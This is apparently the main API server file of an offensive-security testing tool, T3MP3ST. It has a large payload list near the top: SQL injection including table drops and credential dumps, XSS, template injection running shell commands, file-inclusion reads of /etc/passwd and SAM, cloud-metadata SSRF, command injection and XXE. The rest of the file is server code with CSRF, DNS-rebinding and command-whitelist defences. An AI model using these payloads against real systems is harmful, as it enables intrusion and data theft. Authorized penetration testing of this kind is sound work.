/**
 * T3MP3ST API Server v2.0
 *
 * Production-grade API server powering t3mp3st offensive-security operations with:
 * - Comprehensive payload databases (200+ payloads)
 * - Real vulnerability validation
 * - Secret pattern detection
 * - Privilege escalation databases
 * - LLM integration for intelligent analysis
 */

import express, { Request, Response, NextFunction } from 'express';
import cors from 'cors';
import { execFile, spawn } from 'child_process';
import { appendFile, mkdir, readFile, writeFile } from 'fs/promises';
import { join } from 'path';
import { promisify } from 'util';
import { createHash, randomUUID } from 'crypto';
import { config, AVAILABLE_MODELS } from './config/index.js';
import { resolveModels } from './config/provider-models.js';
import { redactString, redactLedgerText, redactSecrets } from './redact.js';
import { LLMBackbone } from './llm/index.js';
import { TempestCommand } from './index.js';
import { OpGeneral } from './general/index.js';
import type { Directive } from './general/index.js';
import { detectLocalAgents, pingLocalAgent, runLocalAgent, syncLocalAgentSelection } from './agent/local-agents.js';
import { FRONTIER_ARSENAL_MILESTONE, NETWORK_COMMANDS, SAFE_COMMANDS, TOOL_ADAPTERS, adapterForBinary, adaptersForFamily, summarizeToolCatalog } from './arsenal/catalog.js';
import { AGENT_PROMPT_PACKS, FOREFRONT_PRESSURE_LANES, OPERATOR_RUNBOOKS, RESOURCE_PACKS, WORKFLOW_PRESETS, forefrontPressureForFamily, promptPacksForFamily, resourcesForFamily, runbookForFamily, searchResources, workflowPresetsForFamily } from './resources/index.js';
import { AI_REDTEAM_PLAYBOOK, AI_REDTEAM_TECHNIQUE_IDS, aiRedTeamBriefing } from './resources/ai-redteam-playbook.js';
import { OPERATOR_SYSTEM_PROMPTS, PLINIAN_OPERATOR_DOCTRINE, THE_FIXER_SYSTEM_PROMPT } from './prompts/index.js';
import { createTargetFromUrl, createTargetFromIP } from './target/index.js';
import type { OperatorArchetype, LLMProvider } from './types/index.js';
import { listOperatorPrompts, setOperatorOverride, resetOperatorOverride, type OperatorOverride } from './operators/index.js';
import { ingestRepoToSourceContext, runWhiteboxAnalysis, resolveRepoSourceForAnalysis, RepoCloneError, RepoPathError } from './recon/whitebox.js';
import { redactCredential } from './evidence/index.js';

const execFileAsync = promisify(execFile);

function isKnownLLMProvider(provider: string): provider is LLMProvider {
  return Object.prototype.hasOwnProperty.call(AVAILABLE_MODELS, provider);
}

// =============================================================================
// PAYLOAD DATABASES (Shared with MCP server)
// =============================================================================

const PAYLOAD_DB = {
  sqli: {
    union: [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION ALL SELECT 1,2,3,4,5--",
      "' UNION SELECT username,password FROM users--",
      "' UNION SELECT table_name,NULL FROM information_schema.tables--",
      "' UNION SELECT @@version,NULL--",
      "' UNION SELECT user(),database()--"
    ],
    blind_boolean: [
      "' AND '1'='1", "' AND '1'='2", "' AND 1=1--", "' AND 1=2--",
      "' AND SUBSTRING(username,1,1)='a' FROM users--",
      "' AND (SELECT COUNT(*) FROM users)>0--"
    ],
    blind_time: [
      "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
      "' AND BENCHMARK(5000000,MD5('test'))--", "'; SELECT pg_sleep(5)--"
    ],
    error_based: [
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
      "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--"
    ],
    stacked: [
      "'; DROP TABLE users--", "'; INSERT INTO users VALUES('hacker','hacked')--",
      "'; EXEC xp_cmdshell('whoami')--"
    ]
  },
  xss: {
    html: [
      '<script>alert(document.domain)</script>', '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>', '<body onload=alert(1)>',
      '<iframe src="javascript:alert(1)">', '<input onfocus=alert(1) autofocus>'
    ],
    attribute: [
      '" onmouseover="alert(1)', "' onmouseover='alert(1)",
      '" onfocus="alert(1)" autofocus="', "javascript:alert(1)"
    ],
    javascript: [
      "'-alert(1)-'", "\\'-alert(1)//", "</script><script>alert(1)</script>",
      "';alert(1)//", "\";alert(1)//"
    ],
    polyglot: [
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
      "-->'\"<img src=x onerror=alert(1)//", "\"><script>alert(1)</script>"
    ]
  },
  ssti: {
    jinja2: ["{{7*7}}", "{{config}}", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"],
    twig: ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"],
    erb: ["<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>"],
    generic: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{7*7}", "#{7*7}"]
  },
  lfi: {
    unix: [
      "../../../etc/passwd", "....//....//....//etc/passwd",
      "..%252f..%252f..%252fetc/passwd", "/etc/passwd%00",
      "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php"
    ],
    windows: [
      "..\\..\\..\\windows\\system32\\config\\sam",
      "..\\..\\..\\windows\\system.ini", "C:\\boot.ini"
    ]
  },
  ssrf: {
    localhost: [
      "http://127.0.0.1", "http://localhost", "http://[::1]",
      "http://127.1", "http://0.0.0.0"
    ],
    cloud_metadata: [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://metadata.google.internal/computeMetadata/v1/"
    ],
    bypass: [
      "http://127.0.0.1.nip.io", "http://2130706433", "http://0x7f000001"
    ]
  },
  cmdi: {
    unix: ["; id", "| id", "|| id", "&& id", "`id`", "$(id)", "; cat /etc/passwd"],
    windows: ["& whoami", "| whoami", "|| whoami", "&& whoami", "& net user"]
  },
  xxe: {
    file_read: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
    ssrf: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>']
  }
};

// =============================================================================
// SERVER CONFIGURATION
// =============================================================================

const PORT = process.env.T3MP3ST_PORT || 3333;
// SECURITY: Default bind is loopback-only. This is a single-operator localhost
// tool, so the process listens on 127.0.0.1 and is unreachable from the network
// unless the operator explicitly opts in with T3MP3ST_HOST=0.0.0.0. The threat
// model is therefore a malicious webpage in the operator's own browser driving
// this local command-executing API (CSRF / DNS-rebinding), NOT remote attackers.
// The CORS lock + origin guard below defend that vector; if this is ever exposed
// beyond localhost, add real Bearer-token auth as the upgrade path.
// DOCKER: Inside containers, bind to 0.0.0.0 (env var can still override).
const HOST = process.env.T3MP3ST_HOST || (process.env.DOCKER === 'true' ? '0.0.0.0' : '127.0.0.1');
// B-02: only enforce the Host-header allow-list when bound to loopback (the
// default). If the operator EXPLICITLY exposes the server (T3MP3ST_HOST set to a
// non-loopback address) they've opted into network access behind their own front,
// so we don't second-guess the Host there.
const HOST_IS_LOOPBACK = /^(127\.|localhost$|::1$|\[::1\]$)/i.test(HOST.trim());

const app = express();

// --- Localhost origin allow-list ------------------------------------------
// A request from the same-origin UI, curl, or the CLI is trusted; a request
// carrying an Origin/Referer that points at some OTHER site is a cross-origin
// drive-by and must be rejected. We accept 127.0.0.1 / localhost / ::1 on ANY
// port (the operator may run the UI on a non-default port) plus the file://
// origin ("null") the UI would send if opened from disk.
//
// A hostname is loopback iff it is EXACTLY `localhost`, `::1`, or a literal address in
// 127.0.0.0/8. CRITICAL: match the full dotted-quad, NEVER a `/^127\./` prefix — a
// prefix also matches attacker-registered names like `127.0.0.1.evil.com` and
// `127.evil.com`, which would defeat BOTH the CSRF/CORS origin gate and the
// anti-rebinding Host gate below. (code-sweep: high-severity bypass, fixed.)
function isLoopbackHostname(host: string): boolean {
  return host === 'localhost' || host === '::1' || /^127(?:\.\d{1,3}){3}$/.test(host);
}
function isLoopbackOrigin(originHeader: string | undefined): boolean {
  if (!originHeader) return false;
  // B-01: the opaque origin "null" (sandboxed iframe, file://, some cross-origin
  // redirects, data: documents) is deliberately NOT trusted — the UI is always
  // http-served from 127.0.0.1, so a "null" Origin is a foreign/sandboxed caller,
  // never our own UI. Trusting it would reopen the CSRF hole this guard closes.
  try {
    const host = new URL(originHeader).hostname.toLowerCase().replace(/^\[|\]$/g, '');
    // B-05: 0.0.0.0 is a bind wildcard, not a real browser page-origin — excluded
    // so it can't serve as a foreign / rebinding origin gap.
    return isLoopbackHostname(host);
  } catch {
    return false;
  }
}

// #84: a SAME-ORIGIN request — the caller's Origin (or Referer) host:port equals THIS server's
// own Host header — is by definition not a foreign-website drive-by. It is trusted ONLY when the
// operator has bound to a non-loopback address (see HOST_IS_LOOPBACK), i.e. they have explicitly
// opted into network access — the same decision that stands the anti-rebinding Host guard down
// below. That lets the operator's own LAN/custom-host UI (e.g. http://192.168.x.x:3333/ui) talk to
// its backend instead of being rejected as cross-origin, while a foreign origin (evil.com) still
// mismatches the Host and is refused. On a loopback bind this is never consulted: the strict
// loopback-only origin gate plus the Host guard remain fully in force, so no CSRF/rebinding gap.
// URL.host is "hostname:port" with the default port (80/443) omitted — exactly how browsers set
// BOTH the Origin and the Host header, so a genuine same-origin request compares equal.
function isSameOriginAsHost(source: string | undefined, hostHeader: string | undefined): boolean {
  if (!source || !hostHeader) return false;
  try {
    return new URL(source).host.toLowerCase() === hostHeader.trim().toLowerCase();
  } catch {
    return false;
  }
}

// CORS locked to the localhost UI origins ONLY. A same-origin fetch from the UI
// (or a tool with no Origin like curl/CLI) is allowed; any other website's
// Origin is rejected so the browser blocks it from reading our responses.
app.use(cors({
  origin(origin, callback) {
    // No Origin header (curl, CLI, server-to-server) → allow.
    if (!origin) return callback(null, true);
    if (isLoopbackOrigin(origin)) return callback(null, true);
    return callback(null, false);
  },
  credentials: true,
}));

// --- Cross-origin CSRF guard (root-cause drive-by defense) ----------------
// Registered BEFORE all routes. For STATE-CHANGING methods, if the request
// carries an Origin (or, absent Origin, a Referer) that is PRESENT and is NOT a
// localhost origin, we reject it 403 — this is the fingerprint of a malicious
// webpage in the operator's browser POSTing to our local command API.
// CRITICAL: requests with NO Origin AND NO Referer (curl, the CLI, MCP,
// server-to-server) are ALLOWED — they cannot be forged by a foreign webpage
// and are not CSRF-able. This single guard neutralizes the drive-by vectors
// behind SEC approval-self-grant, llm/chat systemPrompt, and operators/prompt
// at once. Full Bearer-token auth is the upgrade path if ever exposing this
// server beyond localhost.
const STATE_CHANGING_METHODS = new Set(['POST', 'PUT', 'PATCH', 'DELETE']);
app.use((req: Request, res: Response, next: NextFunction) => {
  if (!STATE_CHANGING_METHODS.has(req.method)) return next();
  const origin = req.get('origin');
  const referer = req.get('referer');
  // Prefer Origin; fall back to Referer only when Origin is absent.
  const source = origin ?? referer;
  // No Origin AND no Referer → trusted local caller (curl/CLI/MCP). Allow.
  if (!source) return next();
  if (isLoopbackOrigin(source)) return next();
  // #84: on a non-loopback (opted-in network) bind, also trust the operator's own same-origin UI.
  if (!HOST_IS_LOOPBACK && isSameOriginAsHost(source, req.headers.host)) return next();
  res.status(403).json({
    error: 'Cross-origin request rejected',
    detail: 'This local API only accepts requests from the localhost UI, curl, or the CLI. A cross-origin (foreign-website) Origin/Referer was detected and blocked to prevent CSRF/drive-by command execution.',
  });
});

// --- Host-header allow-list (anti-DNS-rebinding) --------------------------
// B-02: a DNS-rebinding attack points a name the browser already trusts
// (attacker.com) at 127.0.0.1 and then drives THIS server; the browser sends the
// attacker's name in the Host header, while the Origin/CSRF guard above only
// covers state-CHANGING methods. Rejecting any non-loopback Host closes that gap
// for EVERY method (GET reads included). An absent Host (HTTP/1.1 requires it) is
// rejected too. Only active on a loopback bind (see HOST_IS_LOOPBACK).
function isLoopbackHost(hostHeader: string | undefined): boolean {
  if (!hostHeader) return false;
  let h = hostHeader.trim().toLowerCase();
  if (h.startsWith('[')) {
    const end = h.indexOf(']');            // bracketed IPv6: [::1] or [::1]:3333
    h = end === -1 ? h.slice(1) : h.slice(1, end);
  } else {
    h = h.replace(/:\d+$/, '');            // strip :port for IPv4 / hostname
  }
  return isLoopbackHostname(h);
}
if (HOST_IS_LOOPBACK) {
  app.use((req: Request, res: Response, next: NextFunction) => {
    if (isLoopbackHost(req.headers.host)) return next();
    res.status(403).json({
      error: 'Host header rejected',
      detail: 'This local API only serves loopback Host headers (127.0.0.1 / localhost / ::1). A non-loopback Host was seen and blocked to prevent DNS-rebinding.',
    });
  });
}

app.use(express.json({ limit: '10mb' }));

// Request logging
app.use((req: Request, _res: Response, next: NextFunction) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

// =============================================================================
// LLM BACKBONE INITIALIZATION
// =============================================================================

let llm: LLMBackbone | null = null;

async function initLLM(): Promise<LLMBackbone | null> {
  try {
    const llmConfig = config.getLLMConfig();
    if (providerNeedsApiKey(llmConfig.provider) && !llmConfig.apiKey) {
      console.warn('[T3MP3ST] No API key configured - LLM features disabled');
      return null;
    }
    const backbone = new LLMBackbone(llmConfig);
    console.log(`[T3MP3ST] LLM initialized: ${llmConfig.provider}/${llmConfig.model}`);
    return backbone;
  } catch (error) {
    console.error('[T3MP3ST] Failed to initialize LLM:', error);
    return null;
  }
}

// =============================================================================
// TEMPEST COMMAND SINGLETON
// =============================================================================

/** Active TempestCommand instance (created on first mission start) */
let tempestCommand: TempestCommand | null = null;

function getTempestCommand(): TempestCommand | null {
  return tempestCommand;
}

function createTempestCommandInstance(missionName: string, apiKey: string | undefined, provider: string, model: string): TempestCommand {
  // Tear down previous instance
  if (tempestCommand) {
    tempestCommand.stop();
  }

  const baseConfig = config.getLLMConfig(provider as any, model);

  tempestCommand = new TempestCommand({
    name: missionName,
    llm: {
      provider: provider as any,
      model,
      apiKey,
      baseUrl: baseConfig.baseUrl,
      maxTokens: 4096,
      temperature: 0.7,
    },
  });

  // Wire all events to SSE broadcast
  tempestCommand.connectBroadcast(broadcastEvent);

  // Mirror each discovered mission finding into the persistent findingsLedger so the
  // Evidence Vault (/api/findings) reflects the run instead of showing 0 afterward.
  tempestCommand.on('finding:discovered', ({ finding }) => {
    try {
      upsertMissionFindingToLedger(finding as any, tempestCommand?.mission.getActiveMission()?.id);
    } catch (err) {
      console.error('[T3MP3ST] failed to persist mission finding to ledger:', err instanceof Error ? err.message : err);
    }
  });

  return tempestCommand;
}

// =============================================================================
// UTILITY FUNCTIONS
// =============================================================================

interface ToolResult {
  success: boolean;
  output: string;
  error?: string;
  duration?: number;
}

interface ParsedCommand {
  bin: string;
  args: string[];
}

const SHELL_META = /[|&;$<>`\\]/;
const COMMAND_CONTROL = /[\x00-\x1F\x7F-\x9F\u2028\u2029]/;
const CURL_TRANSPORT_OVERRIDE_FLAGS = new Set([
  '--resolve',
  '--connect-to',
  '--proxy',
  '--preproxy',
  '--socks4',
  '--socks4a',
  '--socks5',
  '--socks5-hostname',
  '--unix-socket',
  '--abstract-unix-socket',
  '--interface',
  '--url',
  '--config',
  '--next',
  '-x',
  '-K',
]);
const CURL_VALUE_FLAGS = new Set([
  '-A', '--user-agent',
  '-b', '--cookie',
  '-c', '--cookie-jar',
  '-d', '--data', '--data-ascii', '--data-binary', '--data-raw', '--data-urlencode',
  '-F', '--form',
  '-H', '--header',
  '-m', '--max-time',
  '-o', '--output',
  '-T', '--upload-file',
  '-u', '--user',
  '-X', '--request',
  '--cacert', '--cert', '--connect-timeout', '--key', '--request-target', '--retry',
]);

function findCurlTransportOverrideFlag(args: string[]): string | undefined {
  for (const arg of args) {
    if (!arg) continue;
    const flag = arg.includes('=') ? arg.slice(0, arg.indexOf('=')) : arg;
    if (CURL_TRANSPORT_OVERRIDE_FLAGS.has(flag)) return flag;
    if (arg.startsWith('-x') && arg !== '-X' && arg.length > 2) return '-x';
    if (arg.startsWith('-K') && arg.length > 2) return '-K';
  }
  return undefined;
}

function looksLikeCurlUrlOperand(arg: string): boolean {
  return /^[a-z][a-z0-9+.-]*:\/\/\S+/i.test(arg)
    || /^(?:[a-z0-9-]+\.)+[a-z]{2,}(?::\d+)?(?:[/?#].*)?$/i.test(arg)
    || /^(?:localhost|(?:\d{1,3}\.){3}\d{1,3})(?::\d+)?(?:[/?#].*)?$/i.test(arg)
    || /^\[[0-9a-f:]+\](?::\d+)?(?:[/?#].*)?$/i.test(arg);
}

function countCurlUrlOperands(args: string[]): number {
  let count = 0;
  let skipNext = false;
  let endOfOptions = false;
  for (const arg of args) {
    if (!arg) continue;
    if (skipNext) { skipNext = false; continue; }
    if (!endOfOptions && arg === '--') { endOfOptions = true; continue; }
    if (!endOfOptions && arg.startsWith('--')) {
      const hasInlineValue = arg.includes('=');
      const flag = hasInlineValue ? arg.slice(0, arg.indexOf('=')) : arg;
      if (!hasInlineValue && CURL_VALUE_FLAGS.has(flag)) skipNext = true;
      continue;
    }
    if (!endOfOptions && arg.startsWith('-')) {
      if (arg.length === 2 && CURL_VALUE_FLAGS.has(arg)) skipNext = true;
      continue;
    }
    if (looksLikeCurlUrlOperand(arg)) count += 1;
  }
  return count;
}

function parseCommand(command: string): ParsedCommand | { error: string } {
  if (SHELL_META.test(command) || COMMAND_CONTROL.test(command)) return { error: 'Shell control characters are not allowed; use direct argv-style commands only.' };
  const parts = command.match(/"[^"]*"|'[^']*'|\S+/g)?.map(part => part.replace(/^["']|["']$/g, '')) || [];
  if (!parts.length) return { error: 'Command required' };
  const [bin, ...args] = parts;
  if (!SAFE_COMMANDS.includes(bin)) return { error: `Command not in whitelist: ${bin}` };
  const adapter = adapterForBinary(bin);
  if (adapter?.execution === 'catalog_only' || adapter?.execution === 'import_only') {
    return { error: `Tool is catalog-only and cannot be executed directly: ${bin}` };
  }
  if (bin === 'curl') {
    const overrideFlag = findCurlTransportOverrideFlag(args);
    if (overrideFlag) {
      return { error: `curl flag ${overrideFlag} changes the effective network destination and is not allowed through /api/tools/execute.` };
    }
    if (countCurlUrlOperands(args) > 1) {
      return { error: 'curl commands with multiple URL operands are not allowed through /api/tools/execute; submit one transfer per approved target.' };
    }
  }
  return { bin, args };
}

function inferCommandTarget(parsed: ParsedCommand): string {
  if (!NETWORK_COMMANDS.has(parsed.bin)) return 'local-host';
  const positional = parsed.args.filter(arg => arg && !arg.startsWith('-'));
  return positional[positional.length - 1] || 'unknown-network-target';
}

function resolveCommandExecutionTarget(
  body: Record<string, unknown>,
  parsed: ParsedCommand,
): { target: string } | { error: string } {
  const inferredTarget = normalizeTargetValue(inferCommandTarget(parsed));

  // Local-only commands can still carry a UI target for bookkeeping, but networked
  // commands must be authorized against the host they will actually contact. A
  // caller-supplied body.target is NOT authoritative; at most it may mirror the
  // parsed command target. This prevents approving one host and executing a
  // whitelisted network command against another.
  if (!NETWORK_COMMANDS.has(parsed.bin)) {
    return { target: normalizeTargetValue(body.target || inferredTarget) };
  }

  if (!inferredTarget || inferredTarget === 'unknown-network-target') {
    return { error: `Could not infer network target for ${parsed.bin}; include the target as a direct command argument.` };
  }

  if (body.target !== undefined) {
    const suppliedTarget = normalizeTargetValue(body.target);
    if (hostFromTarget(suppliedTarget) !== hostFromTarget(inferredTarget)) {
      return {
        error: `Command target mismatch: requested approval target "${suppliedTarget}" does not match parsed command target "${inferredTarget}".`,
      };
    }
  }

  return { target: inferredTarget };
}

async function executeCommand(command: string, timeout = 30000): Promise<ToolResult> {
  const startTime = Date.now();
  const parsed = parseCommand(command);
  if ('error' in parsed) {
    return { success: false, output: '', error: parsed.error, duration: 0 };
  }
  try {
    const { stdout, stderr } = await execFileAsync(parsed.bin, parsed.args, { timeout, maxBuffer: 1024 * 1024 * 10 });
    return { success: true, output: stdout || stderr, duration: Date.now() - startTime };
  } catch (error: any) {
    return { success: false, output: error.stdout || '', error: error.message, duration: Date.now() - startTime };
  }
}



// redactString / redactLedgerText / redactSecrets live in ./redact.ts (pure + unit-tested in isolation;
// importing this file would start the HTTP listener). They are imported at the top of this module.

function rejectDuplicateLedgerId<T>(res: Response, ledger: Map<string, T>, id: unknown, label: string, collectionPath: string): boolean {
  if (typeof id !== 'string' || !id.trim() || !ledger.has(id.trim())) return false;
  res.status(409).json({
    error: `${label} already exists`,
    id: id.trim(),
    next: `Use PATCH ${collectionPath}/${id.trim()} to update an existing record, or omit id to let T3MP3ST mint one.`,
  });
  return true;
}

function clientLedgerId(value: unknown, prefix: string): string {
  return typeof value === 'string' && value.trim() ? value.trim() : newId(prefix);
}

// =============================================================================
// DUAL-MODE CONTRACTS - STANDALONE + T3MP3ST ORGAN
// =============================================================================

type TempestMode = 'standalone' | 't3mp3st';
type DraftStatus = 'draft' | 'queued' | 'launched' | 'archived';
type DraftSource = 'human' | 'agent' | 't3mp3st';
type MissionFamily = 'web_api' | 'ai_red_team' | 'cloud_infra' | 'smart_contract' | 'code_supply_chain' | 'crypto_secrets' | 'reverse_binary' | 'agent_warfare' | 'social_osint' | 'reporting_remediation';
type OperationMode = 'wizard' | 'agent_harness' | 'expert_console' | 'range' | 'review_only';
type GuardAction = 'command_execution' | 'network_request' | 'mission_execution' | 'autonomous_execution' | 'model_call';
type ApprovalStatus = 'pending' | 'approved' | 'rejected' | 'expired';
type EvidenceType = 'artifact' | 'command' | 'log' | 'receipt' | 'report' | 'screenshot' | 'source' | 'note';
type EvidenceProvenanceStrength = 'weak' | 'context' | 'tool' | 'replayable';
type FindingSeverity = 'info' | 'low' | 'medium' | 'high' | 'critical';
type FindingStatus = 'open' | 'validated' | 'false_positive' | 'fix_ready' | 'retest_queued' | 'resolved';
type RetestStatus = 'queued' | 'passed' | 'failed' | 'blocked';
type ReproPackReadiness = 'ready' | 'needs_strong_evidence' | 'needs_retest' | 'blocked';
type PressurePathReadiness = 'armed' | 'needs_repro' | 'needs_receipt' | 'blocked';
type PressurePathPosture = 'simulator' | 'receipt_gated' | 'blocked';
type MemoryType = 'identity' | 'relationship' | 'project' | 'preference' | 'procedure' | 'boundary' | 'open_question';
type MemoryProposalStatus = 'pending' | 'accepted' | 'rejected';
type HypothesisStatus = 'open' | 'testing' | 'supported' | 'weakened' | 'promoted' | 'rejected';
type WorkOrderStatus = 'queued' | 'ready' | 'needs_receipt' | 'running' | 'completed' | 'blocked';
type WorkOrderKind = 'prove' | 'disprove' | 'map_impact' | 'owner_control' | 'retest_design' | 'tool_probe';
type WatchSignalSeverity = 'info' | 'watch' | 'action' | 'block';
type WatchSignalType = 'no_hypothesis' | 'multi_family_active' | 'unsupported_hypothesis' | 'undecomposed_hypothesis' | 'open_work_orders' | 'receipt_required' | 'missing_disproof' | 'supported_unpromoted' | 'finding_needs_retest' | 'retest_unresolved' | 'memory_pending' | 'quiet';
type SelfHealSeverity = 'ok' | 'info' | 'watch' | 'action' | 'block';
type SelfHealActionType = 'pulse_watch_loop' | 'refresh_ledgers' | 'install_tool' | 'seed_hypothesis' | 'decompose_hypothesis' | 'complete_retest' | 'complete_work_order' | 'request_receipt' | 'review_memory' | 'hold_gate';

interface MissionDraft {
  id: string;
  title: string;
  objective: string;
  scope: string[];
  constraints: string;
  urgency: 'low' | 'normal' | 'high' | 'critical';
  opsecPreference: 'overt' | 'normal' | 'covert' | 'ghost';
  mode: TempestMode;
  source: DraftSource;
  status: DraftStatus;
  createdAt: string;
  updatedAt: string;
}

interface RoutePreview {
  draftId: string;
  route: {
    family: MissionFamily;
    missionName: string;
    targets: string[];
    operators: string[];
    opsecLevel: 'silent' | 'covert' | 'loud';
    objectives: string[];
    phases: string[];
    requiresApproval: string[];
    warnings: string[];
  };
  operationDraft: Record<string, unknown>;
}

interface ImprovementProposal {
  id: string;
  routeId: string;
  baseConfigId: string;
  status: 'proposed' | 'validated' | 'rejected' | 'promoted' | 'rolled_back';
  rationale: string;
  expectedMetrics: Record<string, number>;
  risks: string[];
  requiredReplaySuites: string[];
  rollbackTarget: string;
  createdAt: string;
}

interface ApprovalRequest {
  id: string;
  action: GuardAction;
  target: string;
  reason: string;
  status: ApprovalStatus;
  wildcardOptIn?: boolean;
  operationId?: string;
  requestedBy: DraftSource | 'system';
  createdAt: string;
  updatedAt: string;
  approvedBy?: string;
  expiresAt?: string;
}

interface EvidenceEntry {
  id: string;
  missionId?: string;
  operationId?: string;
  findingId?: string;
  type: EvidenceType;
  title: string;
  summary: string;
  source: 'human' | 'agent' | 'tool' | 'system';
  provenanceStrength: EvidenceProvenanceStrength;
  uri?: string;
  command?: string;
  resourceIds: string[];
  createdAt: string;
}

interface FindingRecord {
  id: string;
  missionId?: string;
  operationId?: string;
  family: MissionFamily;
  title: string;
  target: string;
  claim: string;
  impact: string;
  severity: FindingSeverity;
  confidence: number;
  status: FindingStatus;
  evidenceIds: string[];
  resourceIds: string[];
  recommendedFix: string;
  acceptanceCriteria: string[];
  owner?: string;
  createdAt: string;
  updatedAt: string;
  retestIds: string[];
}

interface RetestRecord {
  id: string;
  findingId: string;
  missionId?: string;
  operationId?: string;
  status: RetestStatus;
  method: string;
  acceptanceCriteria: string[];
  evidenceIds: string[];
  resultSummary?: string;
  createdAt: string;
  updatedAt: string;
}

interface HypothesisRecord {
  id: string;
  missionId?: string;
  operationId?: string;
  family: MissionFamily;
  target: string;
  claim: string;
  rationale: string;
  status: HypothesisStatus;
  confidence: number;
  evidenceForIds: string[];
  evidenceAgainstIds: string[];
  findingIds: string[];
  nextTests: string[];
  createdAt: string;
  updatedAt: string;
}

interface WorkOrderRecord {
  id: string;
  hypothesisId: string;
  missionId?: string;
  operationId?: string;
  family: MissionFamily;
  squad: string;
  kind: WorkOrderKind;
  title: string;
  objective: string;
  target: string;
  allowedActions: string[];
  requiresReceipt: boolean;
  toolHints: string[];
  status: WorkOrderStatus;
  evidenceIds: string[];
  resultSummary?: string;
  createdAt: string;
  updatedAt: string;
  completedAt?: string;
}

interface WatchSignalRecord {
  id: string;
  type: WatchSignalType;
  severity: WatchSignalSeverity;
  title: string;
  detail: string;
  recommendedAction: string;
  missionId?: string;
  operationId?: string;
  family?: MissionFamily;
  relatedHypothesisIds: string[];
  relatedWorkOrderIds: string[];
  relatedFindingIds: string[];
  createdAt: string;
}

interface WatchCycleRecord {
  id: string;
  missionId?: string;
  operationId?: string;
  family?: MissionFamily;
  target: string;
  createdAt: string;
  spawnedWorkOrderIds: string[];
  summary: {
    signals: number;
    blocks: number;
    actions: number;
    watches: number;
    spawnedWorkOrders: number;
    nextPulseSeconds: number;
  };
  signals: WatchSignalRecord[];
  nextActions: string[];
}

interface SelfHealActionRecord {
  id: string;
  type: SelfHealActionType;
  severity: SelfHealSeverity;
  title: string;
  detail: string;
  recommendedAction: string;
  canApply: boolean;
  applied: boolean;
  relatedIds: string[];
}

interface MemoryEntry {
  id: string;
  type: MemoryType;
  content: string;
  source: string;
  confidence: number;
  createdAt: string;
  acceptedFrom?: string;
  fingerprint?: string;
  observationCount?: number;
  sourceProposalIds?: string[];
}

interface MemoryProposal {
  id: string;
  status: MemoryProposalStatus;
  type: MemoryType;
  content: string;
  source: string;
  confidence: number;
  rationale: string;
  sourceMissionId?: string;
  sourceOperationId?: string;
  sourceEvidenceIds: string[];
  sourceFindingIds: string[];
  sourceRetestIds: string[];
  createdAt: string;
  updatedAt: string;
  fingerprint?: string;
  observationCount?: number;
  lastSeenAt?: string;
  acceptedAt?: string;
  rejectedAt?: string;
  memoryEntryId?: string;
}

const missionDrafts = new Map<string, MissionDraft>();
const improvementProposals = new Map<string, ImprovementProposal>();
const approvalRequests = new Map<string, ApprovalRequest>();
const evidenceLedger = new Map<string, EvidenceEntry>();
const findingsLedger = new Map<string, FindingRecord>();
const retestLedger = new Map<string, RetestRecord>();
const hypothesisLedger = new Map<string, HypothesisRecord>();
const workOrderLedger = new Map<string, WorkOrderRecord>();
const watchCycleLedger = new Map<string, WatchCycleRecord>();
const memoryCapsule = new Map<string, MemoryEntry>();
const memoryProposals = new Map<string, MemoryProposal>();

/**
 * Mirror a live mission finding into the persistent findingsLedger (the one the
 * Evidence Vault reads via /api/findings). Mission findings otherwise live only in
 * the ephemeral vault (/api/mission/findings) and vanish from the Vault after a run.
 * Deduped by title+target so a finding re-emitted across ticks upserts in place.
 */
function upsertMissionFindingToLedger(finding: {
  id?: string;
  title?: string;
  description?: string;
  severity?: unknown;
  targetId?: string;
}, missionId?: string): void {
  const title = typeof finding.title === 'string' && finding.title.trim() ? finding.title.trim() : 'Untitled finding';
  const target = normalizeTargetValue(finding.targetId);
  const dedupeKey = `${title.toLowerCase()}::${target.toLowerCase()}`;
  const existing = [...findingsLedger.values()].find(
    record => `${record.title.toLowerCase()}::${record.target.toLowerCase()}` === dedupeKey,
  );
  const now = nowIso();
  const severity = normalizeSeverity(finding.severity);
  const claim = typeof finding.description === 'string' && finding.description.trim()
    ? redactLedgerText(finding.description.trim())
    : 'Claim pending evidence review.';

  if (existing) {
    existing.severity = severity;
    existing.claim = claim;
    if (missionId) existing.missionId = missionId;
    existing.updatedAt = now;
    findingsLedger.set(existing.id, existing);
    return;
  }

  const record: FindingRecord = {
    id: newId('finding'),
    missionId,
    operationId: undefined,
    family: 'web_api',
    title: redactLedgerText(title, 240),
    target,
    claim,
    impact: '',
    severity,
    confidence: 0.5,
    status: 'open',
    evidenceIds: [],
    resourceIds: [],
    recommendedFix: '',
    acceptanceCriteria: [],
    createdAt: now,
    updatedAt: now,
    retestIds: [],
  };
  findingsLedger.set(record.id, record);
}

const ROUTE_SCORECARDS: Record<string, Record<string, number | string>> = {
  web_api: {
    precision_floor: 0.82,
    evidence_floor: 0.86,
    false_positive_ceiling: 0.08,
    protected_metric: 'no production writes without explicit approval',
  },
  ai_red_team: {
    boundary_mapping_floor: 0.84,
    evaluator_integrity_floor: 0.8,
    false_positive_ceiling: 0.1,
    protected_metric: 'tool and memory authority boundaries stay explicit',
  },
  code_supply_chain: {
    actionable_fix_floor: 0.85,
    secret_redaction_floor: 1,
    false_positive_ceiling: 0.08,
